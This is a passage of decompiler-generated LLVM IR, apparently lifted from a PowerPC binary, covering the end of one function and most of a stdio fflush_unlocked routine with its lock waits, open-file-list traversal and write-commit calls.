  br i1 %v4_1000eae0, label %dec_label_pc_1000eb18, label %dec_label_pc_1000eb14

dec_label_pc_1000eb14:                            ; preds = %dec_label_pc_1000ead0
  store i1 false, i1* @cr0_eq, align 1
  store i32 ptrtoint (i32* @global_var_100212d0.536 to i32), i32* @r3, align 4
  %v0_1000eb10 = call i32 @__lll_lock_wait_private()
  %v0_1000eb14.pre = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000eb14.pre, i32* @global_var_100212d8.537, align 4
  br label %dec_label_pc_1000eb18

dec_label_pc_1000eb18:                            ; preds = %dec_label_pc_1000ead0, %dec_label_pc_1000eb14
  %v3_1000eb24 = load i32, i32* bitcast (i32** @global_var_100211d0.540 to i32*), align 4
  store i32 %v3_1000eb24, i32* @r3, align 4
  %v3_1000eb28 = load i32, i32* @global_var_100212d4.538, align 4
  store i32 268566528, i32* @r29, align 4
  store i32 0, i32* @r30, align 4
  %v1_1000eb34 = add i32 %v3_1000eb28, 1
  store i32 %v1_1000eb34, i32* @global_var_100212d4.538, align 4
  %v3_1000eb843 = icmp eq i32 %v3_1000eb24, 0
  br i1 %v3_1000eb843, label %dec_label_pc_1000eb8c, label %dec_label_pc_1000eb40

dec_label_pc_1000eb40:                            ; preds = %dec_label_pc_1000eb18, %dec_label_pc_1000eb80
  %v0_1000eb54 = phi i32 [ %v0_1000eb80, %dec_label_pc_1000eb80 ], [ %v3_1000eb24, %dec_label_pc_1000eb18 ]
  %v1_1000eb40 = inttoptr i32 %v0_1000eb54 to i16*
  %v2_1000eb40 = load i16, i16* %v1_1000eb40, align 2
  %v3_1000eb40 = zext i16 %v2_1000eb40 to i32
  %v1_1000eb44 = add i32 %v0_1000eb54, 32
  %v2_1000eb44 = inttoptr i32 %v1_1000eb44 to i32*
  %v3_1000eb44 = load i32, i32* %v2_1000eb44, align 4
  store i32 %v3_1000eb44, i32* @r31, align 4
  %v1_1000eb48 = and i32 %v3_1000eb40, 32816
  store i32 %v1_1000eb48, i32* @r0, align 4
  %v3_1000eb48 = icmp eq i32 %v1_1000eb48, 0
  store i1 %v3_1000eb48, i1* @cr0_eq, align 1
  %v3_1000eb4c = icmp eq i32 %v1_1000eb48, 48
  br i1 %v3_1000eb4c, label %dec_label_pc_1000eb5c, label %dec_label_pc_1000eb54

dec_label_pc_1000eb54:                            ; preds = %dec_label_pc_1000eb40
  store i32 %v0_1000eb54, i32* @r30, align 4
  br label %dec_label_pc_1000eb80

dec_label_pc_1000eb5c:                            ; preds = %dec_label_pc_1000eb40
  %v0_1000eb5c = load i32, i32* @r30, align 4
  %v3_1000eb5c = icmp eq i32 %v0_1000eb5c, 0
  br i1 %v3_1000eb5c, label %dec_label_pc_1000eb64, label %dec_label_pc_1000eb6c

dec_label_pc_1000eb64:                            ; preds = %dec_label_pc_1000eb5c
  store i32 %v3_1000eb44, i32* bitcast (i32** @global_var_100211d0.540 to i32*), align 4
  br label %dec_label_pc_1000eb70

dec_label_pc_1000eb6c:                            ; preds = %dec_label_pc_1000eb5c
  %v2_1000eb6c = add i32 %v0_1000eb5c, 32
  %v3_1000eb6c = inttoptr i32 %v2_1000eb6c to i32*
  store i32 %v3_1000eb44, i32* %v3_1000eb6c, align 4
  %v0_1000eb70.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000eb70

dec_label_pc_1000eb70:                            ; preds = %dec_label_pc_1000eb64, %dec_label_pc_1000eb6c
  %v0_1000eb70 = phi i32 [ %v0_1000eb54, %dec_label_pc_1000eb64 ], [ %v0_1000eb70.pre, %dec_label_pc_1000eb6c ]
  %v1_1000eb70 = inttoptr i32 %v0_1000eb70 to i16*
  %v2_1000eb70 = load i16, i16* %v1_1000eb70, align 2
  %v3_1000eb70 = zext i16 %v2_1000eb70 to i32
  store i32 %v3_1000eb70, i32* @r0, align 4
  %v1_1000eb74 = and i32 %v3_1000eb70, 8192
  %v3_1000eb74 = icmp eq i32 %v1_1000eb74, 0
  store i1 %v3_1000eb74, i1* @cr0_eq, align 1
  br i1 %v3_1000eb74, label %dec_label_pc_1000eb80, label %dec_label_pc_1000eb7c

dec_label_pc_1000eb7c:                            ; preds = %dec_label_pc_1000eb70
  store i32 268495744, i32* @lr, align 4
  %v0_1000eb7c = call i32 @free()
  br label %dec_label_pc_1000eb80

dec_label_pc_1000eb80:                            ; preds = %dec_label_pc_1000eb70, %dec_label_pc_1000eb54, %dec_label_pc_1000eb7c
  %v0_1000eb80 = load i32, i32* @r31, align 4
  store i32 %v0_1000eb80, i32* @r3, align 4
  %v3_1000eb84 = icmp eq i32 %v0_1000eb80, 0
  br i1 %v3_1000eb84, label %dec_label_pc_1000eb84.dec_label_pc_1000eb8c_crit_edge, label %dec_label_pc_1000eb40

dec_label_pc_1000eb84.dec_label_pc_1000eb8c_crit_edge: ; preds = %dec_label_pc_1000eb80
  %v3_1000eb94.pre = load i32, i32* @global_var_100212d4.538, align 4
  br label %dec_label_pc_1000eb8c

dec_label_pc_1000eb8c:                            ; preds = %dec_label_pc_1000eb84.dec_label_pc_1000eb8c_crit_edge, %dec_label_pc_1000eb18
  %v3_1000eb94 = phi i32 [ %v3_1000eb94.pre, %dec_label_pc_1000eb84.dec_label_pc_1000eb8c_crit_edge ], [ %v1_1000eb34, %dec_label_pc_1000eb18 ]
  %v1_1000eb98 = add i32 %v3_1000eb94, -1
  %v3_1000eb9c = icmp eq i32 %v1_1000eb98, 0
  store i32 %v1_1000eb98, i32* @global_var_100212d4.538, align 4
  br i1 %v3_1000eb9c, label %dec_label_pc_1000eba8, label %dec_label_pc_1000ebdc

dec_label_pc_1000eba8:                            ; preds = %dec_label_pc_1000eb8c
  store i32 0, i32* @global_var_100212d8.537, align 4
  %v0_1000ebb8.pr = load i1, i1* @cr0_eq, align 1
  br label %dec_label_pc_1000ebb0

dec_label_pc_1000ebb0:                            ; preds = %dec_label_pc_1000ebb0, %dec_label_pc_1000eba8
  %v0_1000ebb8 = phi i1 [ false, %dec_label_pc_1000ebb0 ], [ %v0_1000ebb8.pr, %dec_label_pc_1000eba8 ]
  br i1 %v0_1000ebb8, label %dec_label_pc_1000ebbc, label %dec_label_pc_1000ebb0

dec_label_pc_1000ebbc:                            ; preds = %dec_label_pc_1000ebb0
  %v0_1000ebbc = load i32, i32* @r0, align 4
  %tmp15 = icmp slt i32 %v0_1000ebbc, 2
  br i1 %tmp15, label %dec_label_pc_1000ebdc, label %dec_label_pc_1000ebc4

dec_label_pc_1000ebc4:                            ; preds = %dec_label_pc_1000ebbc
  %v0_1000ebd8 = call i32 @__asm_mfcr()
  br label %dec_label_pc_1000ebdc

dec_label_pc_1000ebdc:                            ; preds = %dec_label_pc_1000eb8c, %dec_label_pc_1000ebbc, %dec_label_pc_1000ebc4
  store i32 0, i32* @global_var_10021248.566, align 4
  %v3_1000ebf4.pre = load i32, i32* @global_var_100212e0.565, align 4
  %v3_1000ebfc.pre = load i32, i32* @global_var_10021244.564, align 4
  br label %dec_label_pc_1000ebe8

dec_label_pc_1000ebe8:                            ; preds = %dec_label_pc_1000ea9c, %dec_label_pc_1000eac0, %dec_label_pc_1000ebdc
  %v3_1000ebfc = phi i32 [ %v3_1000eaa4, %dec_label_pc_1000ea9c ], [ 1, %dec_label_pc_1000eac0 ], [ %v3_1000ebfc.pre, %dec_label_pc_1000ebdc ]
  %v3_1000ebf4 = phi i32 [ %v1_1000eab4, %dec_label_pc_1000ea9c ], [ %v1_1000eab4, %dec_label_pc_1000eac0 ], [ %v3_1000ebf4.pre, %dec_label_pc_1000ebdc ]
  store i32 268566528, i32* @r11, align 4
  %v1_1000ebf8 = add i32 %v3_1000ebf4, -1
  %v3_1000ec00 = icmp eq i32 %v1_1000ebf8, 0
  store i32 %v1_1000ebf8, i32* @global_var_100212e0.565, align 4
  %v1_1000ec08 = add i32 %v3_1000ebfc, -1
  store i32 %v1_1000ec08, i32* @global_var_10021244.564, align 4
  br i1 %v3_1000ec00, label %dec_label_pc_1000ec14, label %dec_label_pc_1000ec48

dec_label_pc_1000ec14:                            ; preds = %dec_label_pc_1000ebe8
  store i32 0, i32* @global_var_100212e4.563, align 4
  %v0_1000ec24.pr = load i1, i1* @cr0_eq, align 1
  br label %dec_label_pc_1000ec1c

dec_label_pc_1000ec1c:                            ; preds = %dec_label_pc_1000ec1c, %dec_label_pc_1000ec14
  %v0_1000ec24 = phi i1 [ false, %dec_label_pc_1000ec1c ], [ %v0_1000ec24.pr, %dec_label_pc_1000ec14 ]
  br i1 %v0_1000ec24, label %dec_label_pc_1000ec28, label %dec_label_pc_1000ec1c

dec_label_pc_1000ec28:                            ; preds = %dec_label_pc_1000ec1c
  %tmp16 = icmp slt i32 %v1_1000ec08, 2
  br i1 %tmp16, label %dec_label_pc_1000ec48, label %dec_label_pc_1000ec30

dec_label_pc_1000ec30:                            ; preds = %dec_label_pc_1000ec28
  %v0_1000ec44 = call i32 @__asm_mfcr()
  br label %dec_label_pc_1000ec48

dec_label_pc_1000ec48:                            ; preds = %dec_label_pc_1000ebe8, %dec_label_pc_1000ec28, %dec_label_pc_1000ec30
  %v0_1000ec58 = phi i32 [ ptrtoint (i32* @global_var_100212dc.562 to i32), %dec_label_pc_1000ebe8 ], [ ptrtoint (i32* @global_var_100212dc.562 to i32), %dec_label_pc_1000ec28 ], [ %v0_1000ec44, %dec_label_pc_1000ec30 ]
  ret i32 %v0_1000ec58

; uselistorder directives
  uselistorder i32 %v0_1000eb80, { 1, 2, 0 }
  uselistorder i32 %v3_1000eb44, { 1, 0, 2 }
  uselistorder i32 %v0_1000eb54, { 0, 1, 3, 2 }
  uselistorder i32 ()* @free, { 2, 9, 8, 7, 6, 0, 5, 4, 3, 1, 15, 14, 13, 12, 11, 10 }
  uselistorder label %dec_label_pc_1000ec48, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000ebe8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000ebdc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000eb80, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000eb70, { 1, 0 }
  uselistorder label %dec_label_pc_1000eb40, { 1, 0 }
  uselistorder label %dec_label_pc_1000eb18, { 1, 0 }
  uselistorder label %dec_label_pc_1000ea9c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ea98, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_1000ec60 = load i32, i32* @lr, align 4
  store i32 %v0_1000ec60, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32** @global_var_100211d0.540 to i32), i32* %r9.global-to-local, align 4
  %v5_1000ec6c = icmp eq i16* %arg1, bitcast (i32** @global_var_100211d0.540 to i16*)
  store i32 %tmp, i32* @r31, align 4
  br i1 %v5_1000ec6c, label %dec_label_pc_1000ec80, label %dec_label_pc_1000ec8c

dec_label_pc_1000ec80:                            ; preds = %entry
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_1000ec98

dec_label_pc_1000ec8c:                            ; preds = %entry
  %v4_1000ec8c = icmp eq i16* %arg1, null
  store i32 256, i32* @r27, align 4
  br i1 %v4_1000ec8c, label %dec_label_pc_1000ec98, label %dec_label_pc_1000eef4

dec_label_pc_1000ec98:                            ; preds = %dec_label_pc_1000ec8c, %dec_label_pc_1000ec80
  %v1_1000ecb8 = phi i32 [ %tmp, %dec_label_pc_1000ec8c ], [ 0, %dec_label_pc_1000ec80 ]
  store i32 268566528, i32* @r9, align 4
  %v0_1000ec9c = load i32, i32* @r2, align 4
  %v1_1000ec9c = add i32 %v0_1000ec9c, -29808
  store i32 %v1_1000ec9c, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100212dc.562 to i32), i32* %r30.global-to-local, align 4
  %v3_1000eca4 = load i32, i32* @global_var_100212e4.563, align 4
  store i32 %v3_1000eca4, i32* %r0.global-to-local, align 4
  %v4_1000eca8 = icmp eq i32 %v3_1000eca4, %v1_1000ec9c
  br i1 %v4_1000eca8, label %dec_label_pc_1000ece0, label %dec_label_pc_1000ecb4

dec_label_pc_1000ecb4:                            ; preds = %dec_label_pc_1000ec98
  store i32 1, i32* %r0.global-to-local, align 4
  %v4_1000ecb8 = icmp eq i32 %v1_1000ecb8, 268566528
  store i1 %v4_1000ecb8, i1* @cr0_eq, align 1
  store i32 ptrtoint (i32* @global_var_100212dc.562 to i32), i32* @r3, align 4
  %v0_1000ecd8 = call i32 @__lll_lock_wait_private()
  %v0_1000ecdc.pre = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000ecdc.pre, i32* @global_var_100212e4.563, align 4
  br label %dec_label_pc_1000ece0

dec_label_pc_1000ece0:                            ; preds = %dec_label_pc_1000ec98, %dec_label_pc_1000ecb4
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_1000ecec = load i32, i32* @global_var_10021244.564, align 4
  %v3_1000ecf0 = load i32, i32* @global_var_100212e0.565, align 4
  store i32 %v3_1000ecf0, i32* %r0.global-to-local, align 4
  %v1_1000ecf4 = add i32 %v3_1000ecec, 1
  store i32 %v1_1000ecf4, i32* %r11.global-to-local, align 4
  %v3_1000ecf8 = icmp eq i32 %v3_1000ecf0, 0
  store i32 %v1_1000ecf4, i32* @global_var_10021244.564, align 4
  br i1 %v3_1000ecf8, label %dec_label_pc_1000ed04, label %dec_label_pc_1000ed38

dec_label_pc_1000ed04:                            ; preds = %dec_label_pc_1000ece0
  store i32 0, i32* @global_var_100212e4.563, align 4
  %v0_1000ed14.pr = load i1, i1* @cr0_eq, align 1
  br label %dec_label_pc_1000ed0c

dec_label_pc_1000ed0c:                            ; preds = %dec_label_pc_1000ed0c, %dec_label_pc_1000ed04
  %v0_1000ed14 = phi i1 [ false, %dec_label_pc_1000ed0c ], [ %v0_1000ed14.pr, %dec_label_pc_1000ed04 ]
  br i1 %v0_1000ed14, label %dec_label_pc_1000ed20, label %dec_label_pc_1000ed0c

dec_label_pc_1000ed20:                            ; preds = %dec_label_pc_1000ed0c
  store i32 221, i32* %r0.global-to-local, align 4
  %v0_1000ed34 = call i32 @__asm_mfcr()
  store i32 %v0_1000ed34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000ed38

dec_label_pc_1000ed38:                            ; preds = %dec_label_pc_1000ece0, %dec_label_pc_1000ed20
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v0_1000ed3c = load i32, i32* @r2, align 4
  %v1_1000ed3c = add i32 %v0_1000ed3c, -29808
  store i32 %v1_1000ed3c, i32* %r30.global-to-local, align 4
  %v3_1000ed44 = load i32, i32* @global_var_100212d8.537, align 4
  store i32 %v3_1000ed44, i32* %r0.global-to-local, align 4
  %v4_1000ed48 = icmp eq i32 %v3_1000ed44, %v1_1000ed3c
  br i1 %v4_1000ed48, label %dec_label_pc_1000ed84, label %dec_label_pc_1000ed58

dec_label_pc_1000ed58:                            ; preds = %dec_label_pc_1000ed38
  store i32 0, i32* @r9, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1000ed5c = load i32, i32* %r11.global-to-local, align 4
  %v4_1000ed5c = icmp eq i32 %v0_1000ed5c, 0
  store i1 %v4_1000ed5c, i1* @cr0_eq, align 1
  br i1 %v4_1000ed5c, label %dec_label_pc_1000ed80, label %dec_label_pc_1000ed78

dec_label_pc_1000ed78:                            ; preds = %dec_label_pc_1000ed58
  store i32 ptrtoint (i32* @global_var_100212d0.536 to i32), i32* @r3, align 4
  %v0_1000ed7c = call i32 @__lll_lock_wait_private()
  %v0_1000ed80.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000ed80

dec_label_pc_1000ed80:                            ; preds = %dec_label_pc_1000ed58, %dec_label_pc_1000ed78
  %v0_1000ed80 = phi i32 [ %v1_1000ed3c, %dec_label_pc_1000ed58 ], [ %v0_1000ed80.pre, %dec_label_pc_1000ed78 ]
  store i32 %v0_1000ed80, i32* @global_var_100212d8.537, align 4
  br label %dec_label_pc_1000ed84

dec_label_pc_1000ed84:                            ; preds = %dec_label_pc_1000ed38, %dec_label_pc_1000ed80
  store i32 268566528, i32* @r11, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_1000ed90 = load i32, i32* bitcast (i32** @global_var_100211d0.540 to i32*), align 4
  store i32 %v3_1000ed90, i32* @r31, align 4
  %v3_1000ed94 = load i32, i32* @global_var_100212d4.538, align 4
  store i32 %v3_1000ed94, i32* %r0.global-to-local, align 4
  %v3_1000ed98 = icmp eq i32 %v3_1000ed94, 0
  br i1 %v3_1000ed98, label %dec_label_pc_1000eda0, label %dec_label_pc_1000edd4

dec_label_pc_1000eda0:                            ; preds = %dec_label_pc_1000ed84
  store i32 0, i32* @global_var_100212d8.537, align 4
  %v0_1000edb0.pr = load i1, i1* @cr0_eq, align 1
  br label %dec_label_pc_1000eda8

dec_label_pc_1000eda8:                            ; preds = %dec_label_pc_1000eda8, %dec_label_pc_1000eda0
  %v0_1000edb0 = phi i1 [ false, %dec_label_pc_1000eda8 ], [ %v0_1000edb0.pr, %dec_label_pc_1000eda0 ]
  br i1 %v0_1000edb0, label %dec_label_pc_1000edbc, label %dec_label_pc_1000eda8

dec_label_pc_1000edbc:                            ; preds = %dec_label_pc_1000eda8
  store i32 221, i32* %r0.global-to-local, align 4
  %v0_1000edd0 = call i32 @__asm_mfcr()
  store i32 %v0_1000edd0, i32* %r0.global-to-local, align 4
  %v0_1000eee4.pr.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000edd4

dec_label_pc_1000edd4:                            ; preds = %dec_label_pc_1000ed84, %dec_label_pc_1000edbc
  %v0_1000eee4.pr = phi i32 [ %v3_1000ed90, %dec_label_pc_1000ed84 ], [ %v0_1000eee4.pr.pre, %dec_label_pc_1000edbc ]
  store i32 0, i32* %r30.global-to-local, align 4
  store i32 268566528, i32* @r28, align 4
  %v0_1000eddc = load i32, i32* @r2, align 4
  %v1_1000eddc = add i32 %v0_1000eddc, -29808
  store i32 %v1_1000eddc, i32* @r29, align 4
  %v3_1000eee43 = icmp eq i32 %v0_1000eee4.pr, 0
  br i1 %v3_1000eee43, label %dec_label_pc_1000eeec, label %dec_label_pc_1000ede4

dec_label_pc_1000ede4:                            ; preds = %dec_label_pc_1000edd4, %dec_label_pc_1000eee0
  %v0_1000ee08 = phi i32 [ %v3_1000eee0, %dec_label_pc_1000eee0 ], [ %v0_1000eee4.pr, %dec_label_pc_1000edd4 ]
  %v1_1000ede4 = inttoptr i32 %v0_1000ee08 to i16*
  %v2_1000ede4 = load i16, i16* %v1_1000ede4, align 2
  %v3_1000ede4 = zext i16 %v2_1000ede4 to i32
  store i32 %v3_1000ede4, i32* %r0.global-to-local, align 4
  %v1_1000ede8 = and i32 %v3_1000ede4, 64
  store i32 %v1_1000ede8, i32* @r11, align 4
  %v3_1000ede8 = icmp eq i32 %v1_1000ede8, 0
  store i1 %v3_1000ede8, i1* @cr0_eq, align 1
  br i1 %v3_1000ede8, label %dec_label_pc_1000eee0, label %dec_label_pc_1000edf0

dec_label_pc_1000edf0:                            ; preds = %dec_label_pc_1000ede4
  %v3_1000edf0 = load i32, i32* @global_var_100211d4.569, align 4
  store i32 %v3_1000edf0, i32* %r0.global-to-local, align 4
  %v3_1000edf4 = icmp eq i32 %v3_1000edf0, 2
  br i1 %v3_1000edf4, label %dec_label_pc_1000ee48, label %dec_label_pc_1000edfc

dec_label_pc_1000edfc:                            ; preds = %dec_label_pc_1000edf0
  %v1_1000edfc = add i32 %v0_1000ee08, 64
  %v2_1000edfc = inttoptr i32 %v1_1000edfc to i32*
  %v3_1000edfc = load i32, i32* %v2_1000edfc, align 4
  store i32 %v3_1000edfc, i32* %r0.global-to-local, align 4
  %v1_1000ee00 = load i32, i32* @r29, align 4
  %v4_1000ee00 = icmp eq i32 %v3_1000edfc, %v1_1000ee00
  br i1 %v4_1000ee00, label %dec_label_pc_1000ee3c, label %dec_label_pc_1000ee38

dec_label_pc_1000ee38:                            ; preds = %dec_label_pc_1000edfc
  %v1_1000ee08 = add i32 %v0_1000ee08, 56
  store i32 %v1_1000ee08, i32* @r3, align 4
  store i32 0, i32* @r9, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i1 false, i1* @cr0_eq, align 1
  %v0_1000ee34 = call i32 @__lll_lock_wait_private()
  %v0_1000ee38.pre = load i32, i32* @r29, align 4
  %v1_1000ee38.pre = load i32, i32* @r31, align 4
  %v2_1000ee38 = add i32 %v1_1000ee38.pre, 64
  %v3_1000ee38 = inttoptr i32 %v2_1000ee38 to i32*
  store i32 %v0_1000ee38.pre, i32* %v3_1000ee38, align 4
  %v0_1000ee3c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000ee3c

dec_label_pc_1000ee3c:                            ; preds = %dec_label_pc_1000edfc, %dec_label_pc_1000ee38
  %v0_1000ee3c = phi i32 [ %v0_1000ee08, %dec_label_pc_1000edfc ], [ %v0_1000ee3c.pre, %dec_label_pc_1000ee38 ]
  %v1_1000ee3c = add i32 %v0_1000ee3c, 60
  %v2_1000ee3c = inttoptr i32 %v1_1000ee3c to i32*
  %v3_1000ee3c = load i32, i32* %v2_1000ee3c, align 4
  %v1_1000ee40 = add i32 %v3_1000ee3c, 1
  store i32 %v1_1000ee40, i32* %r9.global-to-local, align 4
  store i32 %v1_1000ee40, i32* %v2_1000ee3c, align 4
  %v0_1000ee48.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000ee48

dec_label_pc_1000ee48:                            ; preds = %dec_label_pc_1000edf0, %dec_label_pc_1000ee3c
  %v0_1000ee5c = phi i32 [ %v0_1000ee08, %dec_label_pc_1000edf0 ], [ %v0_1000ee48.pre, %dec_label_pc_1000ee3c ]
  %v1_1000ee48 = inttoptr i32 %v0_1000ee5c to i16*
  %v2_1000ee48 = load i16, i16* %v1_1000ee48, align 2
  %v3_1000ee48 = zext i16 %v2_1000ee48 to i32
  %v0_1000ee4c = load i32, i32* @r27, align 4
  %v2_1000ee4c = or i32 %v0_1000ee4c, %v3_1000ee48
  %v1_1000ee50 = xor i32 %v2_1000ee4c, 320
  store i32 %v1_1000ee50, i32* %r0.global-to-local, align 4
  %v1_1000ee54 = and i32 %v1_1000ee50, 832
  store i32 %v1_1000ee54, i32* %r9.global-to-local, align 4
  %v3_1000ee54 = icmp eq i32 %v1_1000ee54, 0
  store i1 %v3_1000ee54, i1* @cr0_eq, align 1
  br i1 %v3_1000ee54, label %dec_label_pc_1000ee5c, label %dec_label_pc_1000ee88

dec_label_pc_1000ee5c:                            ; preds = %dec_label_pc_1000ee48
  store i32 268496484, i32* @lr, align 4
  %v3_1000ee60 = call i32 @__stdio_wcommit(i32 %v0_1000ee5c, i32 0)
  %v3_1000ee64 = icmp eq i32 %v3_1000ee60, 0
  br i1 %v3_1000ee64, label %dec_label_pc_1000ee74, label %dec_label_pc_1000ee6c

dec_label_pc_1000ee6c:                            ; preds = %dec_label_pc_1000ee5c
  store i32 -1, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000ee88

dec_label_pc_1000ee74:                            ; preds = %dec_label_pc_1000ee5c
  %v0_1000ee74 = load i32, i32* @r31, align 4
  %v1_1000ee74 = inttoptr i32 %v0_1000ee74 to i16*
  %v2_1000ee74 = load i16, i16* %v1_1000ee74, align 2
  %v3_1000ee74 = zext i16 %v2_1000ee74 to i32
  store i32 %v3_1000ee74, i32* %r0.global-to-local, align 4
  %v1_1000ee78 = add i32 %v0_1000ee74, 8
  %v2_1000ee78 = inttoptr i32 %v1_1000ee78 to i32*
  %v3_1000ee78 = load i32, i32* %v2_1000ee78, align 4
  store i32 %v3_1000ee78, i32* %r9.global-to-local, align 4
  %v1_1000ee7c = call i32 @__asm_rlwinm(i32 %v3_1000ee74, i32 0, i32 26, i32 24)
  %v2_1000ee7c = trunc i32 %v1_1000ee7c to i16
  store i32 %v1_1000ee7c, i32* %r0.global-to-local, align 4
  %v1_1000ee80 = load i32, i32* @r31, align 4
  %v2_1000ee80 = add i32 %v1_1000ee80, 28
  %v3_1000ee80 = inttoptr i32 %v2_1000ee80 to i32*
  store i32 %v3_1000ee78, i32* %v3_1000ee80, align 4
  %v3_1000ee84 = load i32, i32* @r31, align 4
  %v4_1000ee84 = inttoptr i32 %v3_1000ee84 to i16*
  store i16 %v2_1000ee7c, i16* %v4_1000ee84, align 2
  br label %dec_label_pc_1000ee88

dec_label_pc_1000ee88:                            ; preds = %dec_label_pc_1000ee48, %dec_label_pc_1000ee6c, %dec_label_pc_1000ee74
  %v3_1000ee88 = load i32, i32* @global_var_100211d4.569, align 4
  store i32 %v3_1000ee88, i32* %r0.global-to-local, align 4
  %v3_1000ee8c = icmp eq i32 %v3_1000ee88, 2
  br i1 %v3_1000ee8c, label %dec_label_pc_1000eee0, label %dec_label_pc_1000ee94

dec_label_pc_1000ee94:                            ; preds = %dec_label_pc_1000ee88
  %v0_1000ee94 = load i32, i32* @r31, align 4
  %v1_1000ee94 = add i32 %v0_1000ee94, 60
  %v2_1000ee94 = inttoptr i32 %v1_1000ee94 to i32*
  %v3_1000ee94 = load i32, i32* %v2_1000ee94, align 4
  %v1_1000ee98 = add i32 %v3_1000ee94, -1
  store i32 %v1_1000ee98, i32* %r9.global-to-local, align 4
  %v3_1000ee9c = icmp eq i32 %v1_1000ee98, 0
  store i32 %v1_1000ee98, i32* %v2_1000ee94, align 4
  br i1 %v3_1000ee9c, label %dec_label_pc_1000eea8, label %dec_label_pc_1000eee0

dec_label_pc_1000eea8:                            ; preds = %dec_label_pc_1000ee94
  %v0_1000eea8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000eea8 = load i32, i32* @r31, align 4
  %v2_1000eea8 = add i32 %v1_1000eea8, 64
  %v3_1000eea8 = inttoptr i32 %v2_1000eea8 to i32*
  store i32 %v0_1000eea8, i32* %v3_1000eea8, align 4
  %v0_1000eebc.pr = load i1, i1* @cr0_eq, align 1
  br label %dec_label_pc_1000eeb4

dec_label_pc_1000eeb4:                            ; preds = %dec_label_pc_1000eeb4, %dec_label_pc_1000eea8
  %v0_1000eebc = phi i1 [ false, %dec_label_pc_1000eeb4 ], [ %v0_1000eebc.pr, %dec_label_pc_1000eea8 ]
  br i1 %v0_1000eebc, label %dec_label_pc_1000eec0, label %dec_label_pc_1000eeb4

dec_label_pc_1000eec0:                            ; preds = %dec_label_pc_1000eeb4
  %v0_1000eec0 = load i32, i32* %r0.global-to-local, align 4
  %tmp16 = icmp slt i32 %v0_1000eec0, 2
  br i1 %tmp16, label %dec_label_pc_1000eee0, label %dec_label_pc_1000eec8

dec_label_pc_1000eec8:                            ; preds = %dec_label_pc_1000eec0
  store i32 221, i32* %r0.global-to-local, align 4
  %v0_1000eedc = call i32 @__asm_mfcr()
  store i32 %v0_1000eedc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000eee0

dec_label_pc_1000eee0:                            ; preds = %dec_label_pc_1000ee94, %dec_label_pc_1000eec0, %dec_label_pc_1000ee88, %dec_label_pc_1000ede4, %dec_label_pc_1000eec8
  %v0_1000eee0 = load i32, i32* @r31, align 4
  %v1_1000eee0 = add i32 %v0_1000eee0, 32
  %v2_1000eee0 = inttoptr i32 %v1_1000eee0 to i32*
  %v3_1000eee0 = load i32, i32* %v2_1000eee0, align 4
  store i32 %v3_1000eee0, i32* @r31, align 4
  %v3_1000eee4 = icmp eq i32 %v3_1000eee0, 0
  br i1 %v3_1000eee4, label %dec_label_pc_1000eeec, label %dec_label_pc_1000ede4

dec_label_pc_1000eeec:                            ; preds = %dec_label_pc_1000eee0, %dec_label_pc_1000edd4
  store i32 ptrtoint (i32* @global_var_1000eef0.573 to i32), i32* @lr, align 4
  %v0_1000eeec = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_1000ef2c

dec_label_pc_1000eef4:                            ; preds = %dec_label_pc_1000ec8c
  %v3_1000eef4 = load i16, i16* %arg1, align 2
  %v4_1000eef4 = zext i16 %v3_1000eef4 to i32
  store i32 %v4_1000eef4, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r30, align 4
  %v1_1000eefc = and i32 %v4_1000eef4, 64
  store i32 %v1_1000eefc, i32* %r9.global-to-local, align 4
  %v3_1000eefc = icmp eq i32 %v1_1000eefc, 0
  br i1 %v3_1000eefc, label %dec_label_pc_1000ef2c, label %dec_label_pc_1000ef04

dec_label_pc_1000ef04:                            ; preds = %dec_label_pc_1000eef4
  store i32 268496648, i32* @lr, align 4
  %v1_1000ef04 = load i32, i32* @r4, align 4
  %v2_1000ef04 = call i32 @__stdio_wcommit(i32 %v1_1000eefc, i32 %v1_1000ef04)
  store i32 -1, i32* @r30, align 4
  %v3_1000ef0c = icmp eq i32 %v2_1000ef04, 0
  br i1 %v3_1000ef0c, label %dec_label_pc_1000ef14, label %dec_label_pc_1000ef2c

dec_label_pc_1000ef14:                            ; preds = %dec_label_pc_1000ef04
  %v0_1000ef14 = load i32, i32* @r31, align 4
  %v1_1000ef14 = inttoptr i32 %v0_1000ef14 to i16*
  %v2_1000ef14 = load i16, i16* %v1_1000ef14, align 2
  %v3_1000ef14 = zext i16 %v2_1000ef14 to i32
  store i32 %v3_1000ef14, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r30, align 4
  %v1_1000ef1c = add i32 %v0_1000ef14, 8
  %v2_1000ef1c = inttoptr i32 %v1_1000ef1c to i32*
  %v3_1000ef1c = load i32, i32* %v2_1000ef1c, align 4
  store i32 %v3_1000ef1c, i32* %r9.global-to-local, align 4
